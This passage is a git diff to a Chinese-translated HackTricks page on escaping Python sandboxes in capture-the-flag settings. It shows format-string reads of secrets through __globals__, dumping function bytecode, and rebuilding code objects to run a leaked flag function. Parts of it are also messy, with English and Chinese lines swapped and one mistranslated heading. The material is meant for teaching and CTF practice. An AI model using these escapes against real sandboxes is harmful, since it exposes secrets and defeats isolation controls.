 {% hint style="info" %}
 然而，有一个**限制**，您只能使用符号`.[]`，因此您**无法执行任意代码**，只能读取信息。\
@@ -2275,12 +1089,12 @@ get_name_for_avatar(st, people_obj = people)
 
 另请注意，您可以使用`.__dict__`来枚举对象的元素，例如`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。
 
-格式字符串的一些其他有趣特性是通过添加**`!s`**、**`!r`**和**`!a`**来在指定对象中执行**`str`**、**`repr`**和**`ascii`**函数，分别表示字符串、表示和ASCII。
+格式字符串的一些其他有趣特性是通过添加**`!s`**、**`!r`**、**`!a`**来在指定对象中执行**`str`**、**`repr`**和**`ascii`**函数，分别表示字符串、表示和ASCII格式。
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-此外，还可以在类中**编写新的格式化程序**：
+此外，还可以在类中编写新的格式化程序：
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -2291,10 +1105,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**更多关于格式化字符串的例子**可以在[https://pyformat.info/](https://pyformat.info)找到。
+**更多示例**关于**格式化字符串**的例子可以在[**https://pyformat.info/**](https://pyformat.info)找到。
 
 {% hint style="danger" %}
-还可以查看以下页面，其中包含从Python内部对象中读取敏感信息的工具：
+还要查看以下页面，其中包含从Python内部对象中**读取敏感信息**的工具：
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -2331,60 +1145,7 @@ return "THIS-IS-THE-FALG!"
 else:
 return "Nope"
 ```
-#### dir
-
-The `dir` function in Python is used to get a list of names in the current local scope or a specific object's attributes. It returns a sorted list of strings containing the names defined by a module, class, instance, or any other object with a `__dir__()` method.
-
-##### Syntax
-
-```python
-dir([object])
-```
-
-##### Parameters
-
-- `object` (optional): The object whose attributes are to be listed. If not provided, `dir()` returns the names in the current local scope.
-
-##### Return Value
-
-The `dir()` function returns a sorted list of strings containing the names defined by the specified object.
-
-##### Examples
-
-1. Get the names in the current local scope:
-
-```python
-print(dir())
-```
-
-Output:
-
-```
-['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'object']
-```
-
-2. Get the attributes of a specific object:
-
-```python
-class MyClass:
-    def __init__(self):
-        self.name = "John"
-        self.age = 30
-
-my_object = MyClass()
-print(dir(my_object))
-```
-
-Output:
-
-```
-['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']
-```
-
-##### Notes
-
-- The `dir()` function can be useful for exploring the attributes of an object and understanding its structure.
-- It is important to note that not all objects have a `__dir__()` method. In such cases, `dir()` falls back to a default implementation that returns the attributes of the object's class and its base classes.
+#### 目录
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -2402,7 +1163,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**在这里查看更多获取全局变量的地方**](./#globals-and-locals)
+[**在这里查看更多获取全局变量的方法**](./#globals-and-locals)
 
 ### **访问函数代码**
 
@@ -2422,73 +1183,29 @@ dir(get_flag.__code__)
 ```
 ### 获取代码信息
 
-To bypass Python sandboxes, it is crucial to gather as much information about the code as possible. This includes understanding the programming language, libraries, and frameworks used, as well as any external dependencies.
-
-为了绕过Python沙箱，收集尽可能多的关于代码的信息至关重要。这包括了解所使用的编程语言、库和框架，以及任何外部依赖项。
+To bypass Python sandboxes, it is crucial to gather as much information about the code being executed as possible. This information can help identify potential vulnerabilities and weaknesses in the sandbox environment. Here are some techniques to gather code information:
 
 #### 1. Inspecting the Code
 
-#### 1. 检查代码
+One of the simplest ways to gather code information is by inspecting the source code itself. This can be done by reading the code directly or using tools like static code analyzers. By analyzing the code, you can identify any potential security flaws or vulnerabilities that can be exploited.
 
-Start by inspecting the code to identify any potential vulnerabilities or weak points. Look for insecure functions, input validation issues, or any other security flaws that could be exploited.
+#### 2. Dynamic Analysis
 
-首先检查代码，以确定任何潜在的漏洞或弱点。寻找不安全的函数、输入验证问题或其他可能被利用的安全漏洞。
+Dynamic analysis involves running the code in a controlled environment and monitoring its behavior. This can be done using tools like debuggers or dynamic analysis frameworks. By observing the code's execution, you can gather information about its runtime behavior, such as the functions being called, the data being processed, and any external dependencies.
 
-#### 2. Analyzing Libraries and Frameworks
+#### 3. Reverse Engineering
 
-#### 2. 分析库和框架
+Reverse engineering can be used to extract information from compiled or obfuscated code. This involves decompiling the code or analyzing its binary representation to understand its functionality. Reverse engineering can help uncover hidden features, identify potential vulnerabilities, or reveal any malicious behavior.
 
-Understand the libraries and frameworks used in the code. Research their security history and vulnerabilities. Look for any known exploits or weaknesses that could be leveraged.
+#### 4. Code Review
 
-了解代码中使用的库和框架。研究它们的安全历史和漏洞。寻找任何已知的可利用的漏洞或弱点。
+Code review involves manually examining the code for security vulnerabilities. This can be done by experienced developers or security experts who are familiar with common coding mistakes and best practices. Code review can help identify potential security flaws, such as input validation issues, insecure coding patterns, or improper use of libraries.
 
-#### 3. Identifying External Dependencies
+#### 5. Fuzzing
 
-#### 3. 识别外部依赖项
+Fuzzing is a technique used to test the code's resilience against unexpected inputs. By providing random or malformed inputs to the code, you can identify potential crashes, memory leaks, or other vulnerabilities. Fuzzing can be automated using tools or performed manually.
 
-Identify any external dependencies that the code relies on. Research their security posture and any potential vulnerabilities. Ensure that these dependencies are up to date and do not have any known security issues.
-
-识别代码所依赖的任何外部依赖项。研究它们的安全状况和任何潜在的漏洞。确保这些依赖项是最新的，并且没有任何已知的安全问题。
-
-### Analyzing the Execution Environment
-
-### 分析执行环境
-
-Understanding the execution environment is crucial for bypassing Python sandboxes. This includes analyzing the operating system, Python version, and any additional security measures in place.
-
-了解执行环境对于绕过Python沙箱至关重要。这包括分析操作系统、Python版本以及任何其他已经实施的安全措施。
-
-#### 1. Operating System Analysis
-
-#### 1. 操作系统分析
-
-Analyze the operating system to identify any specific security features or restrictions that may affect the execution of the code. This could include file system permissions, process isolation, or other security mechanisms.
-
-分析操作系统，以确定可能影响代码执行的特定安全功能或限制。这可能包括文件系统权限、进程隔离或其他安全机制。
-
-#### 2. Python Version Analysis
-
-#### 2. Python版本分析
-
-Understand the Python version being used and research any security vulnerabilities or weaknesses associated with that version. Ensure that the Python interpreter is up to date and does not have any known vulnerabilities.
-
-了解所使用的Python版本，并研究与该版本相关的任何安全漏洞或弱点。确保Python解释器是最新的，并且没有任何已知的漏洞。
-
-#### 3. Additional Security Measures
-
-#### 3. 其他安全措施
-
-Identify any additional security measures in place, such as firewalls, intrusion detection systems, or antivirus software. Understand how these measures may impact the execution of the code and devise strategies to bypass them if necessary.
-
-识别已经实施的任何其他安全措施，例如防火墙、入侵检测系统或防病毒软件。了解这些措施可能如何影响代码的执行，并在必要时制定绕过它们的策略。
-
-### Conclusion
-
-### 结论
-
-Gathering code information and analyzing the execution environment are essential steps in bypassing Python sandboxes. By understanding the code and its dependencies, as well as the execution environment, you can identify potential vulnerabilities and devise strategies to bypass security measures.
-
-收集代码信息和分析执行环境是绕过Python沙箱的关键步骤。通过了解代码及其依赖项以及执行环境，您可以识别潜在的漏洞，并制定绕过安全措施的策略。
+By gathering code information through these techniques, you can gain a better understanding of the code's behavior and identify potential weaknesses in the sandbox environment. This information can be used to develop effective bypass techniques and enhance the overall security of the system.
 ```python
 # Another example
 s = '''
@@ -2538,22 +1255,32 @@ get_flag.__code__.co_code
 
 To bypass Python sandboxes, it is often necessary to understand how the sandboxing mechanisms work. One way to do this is by disassembling the target function to analyze its bytecode instructions.
 
-In Python, the `dis` module can be used to disassemble a function. This module provides functions to disassemble Python bytecode into a more human-readable form.
+为了绕过Python沙盒，通常需要了解沙盒机制的工作原理。一种方法是通过反汇编目标函数来分析其字节码指令。
 
-To disassemble a function, you can use the `dis.dis()` function and pass the function object as an argument. This will display the bytecode instructions of the function.
+Disassembling a function allows us to see the low-level instructions that make up the function's logic. By examining these instructions, we can identify any security checks or restrictions imposed by the sandbox.
+
+反汇编函数可以让我们看到构成函数逻辑的低级指令。通过检查这些指令，我们可以识别沙盒所施加的任何安全检查或限制。
+
+To disassemble a function in Python, we can use the `dis` module. This module provides a `dis` function that takes a function object as an argument and prints the disassembled bytecode instructions.
+
+要在Python中反汇编函数，我们可以使用`dis`模块。该模块提供了一个`dis`函数，它以函数对象作为参数，并打印反汇编的字节码指令。
+
+Here is an example of how to disassemble a function named `target_function`:
+
+以下是如何反汇编名为`target_function`的函数的示例：
 
 ```python
 import dis
 
 def target_function():
-    # Function code here
+    # Function logic here
 
 dis.dis(target_function)
 ```
 
-The output will show the bytecode instructions of the function, including the opcode, arguments, and line numbers. By analyzing these instructions, you can gain insights into how the function operates and potentially find vulnerabilities or ways to bypass the sandboxing mechanisms.
+The output will display the bytecode instructions of the `target_function`, allowing us to analyze its behavior and identify any potential vulnerabilities or bypass techniques.
 
-Keep in mind that disassembling a function is just one step in the process of bypassing Python sandboxes. It is important to have a good understanding of Python bytecode and the sandboxing mechanisms in order to effectively analyze and exploit the target environment.
+输出将显示`target_function`的字节码指令，使我们能够分析其行为并识别任何潜在的漏洞或绕过技术。
 ```python
 import dis
 dis.dis(get_flag)
@@ -2621,7 +1348,7 @@ return "Nope"
 ```
 ### 创建代码对象
 
-首先，我们需要知道**如何创建和执行代码对象**，这样我们就可以创建一个来执行我们泄露的函数：
+首先，我们需要知道**如何创建和执行代码对象**，这样我们就可以创建一个来执行我们的泄漏函数：
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -2647,8 +1374,6 @@ import types
 types.CodeType.__doc__
 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 ```
-{% endhint %}
-
 ### 重新创建一个泄漏的函数
 
 {% hint style="warning" %}
@@ -2664,7 +1389,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### 绕过防御
+### 绕过防御措施
 
 在本文开头的示例中，您可以看到如何使用`compile`函数执行任何Python代码。这很有趣，因为您可以使用一行代码执行整个脚本（我们也可以使用`exec`来做同样的事情）。\
 无论如何，有时候在本地机器上创建一个编译对象并在CTF机器上执行它可能是有用的（例如，因为我们在CTF中没有`compile`函数）。
@@ -2696,7 +1421,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-如果您无法访问`eval`或`exec`，您可以创建一个**适当的函数**，但是直接调用它通常会失败，显示：_在受限模式下无法访问构造函数_。因此，您需要一个**不在受限环境中的函数来调用此函数**。
+如果您无法访问`eval`或`exec`，您可以创建一个**适当的函数**，但是直接调用它通常会失败，显示"在受限模式下无法访问构造函数"。因此，您需要一个**不在受限环境中的函数来调用此函数**。
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -2719,7 +1444,7 @@ f(42)
 ### 断言
 
 使用参数`-O`执行的Python将删除断言语句和任何基于**debug**值的条件代码。\
-因此，像以下这样的检查语句将被删除：
+因此，像以下这样的检查语句将被移除：
 ```python
 def check_permission(super_user):
 try:
@@ -2739,22 +1464,23 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
+
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
-
-![](<../../../.gitbook/assets/image (9) (1) (2).png>)
-
-\
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具驱动。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
